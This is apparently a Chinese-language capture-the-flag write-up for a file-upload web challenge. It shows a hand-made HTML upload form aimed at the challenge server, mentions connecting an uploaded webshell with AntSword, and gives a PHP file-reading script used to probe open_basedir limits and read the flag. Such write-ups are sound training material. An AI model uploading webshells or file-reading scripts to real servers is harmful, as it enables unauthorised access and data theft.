打开发现没有提交界面，只有一个index.php的界面（开始很懵逼不知道怎么提交），然后发现可以手撕一个前端的提交界面。提交界面如下：

```html
<!DOCTYPE html>
<html>
<body>

<form action="http://web1.0ops.sjtu.cn:40010/file/index.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file"><br>
    <input type="submit" value="上传文件">
</form>

</body>
</html>
```

提交后发现用蚁剑连接后没有权限（disable中禁用了好多函数），然后一直在想办法绕过（绕不了一点），后来发现可以用类似命令行注入的方式来获取相应的文件名

先查找所有目录下的文件名：

```php
<?php
// 读取文件内容
$file_path = '/';
$file_content = file_get_contents($file_path);

// 输出文件内容
echo $file_content;
?>
```

报错 file_get_contents(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html/file/:/var/www/html/upload/:/flag/:/tmp/) in **/var/www/html/upload/2.php** on line **4**

只能查找四个目录下的文件，然后即可找到/flag下的文件，打开即为相应的flag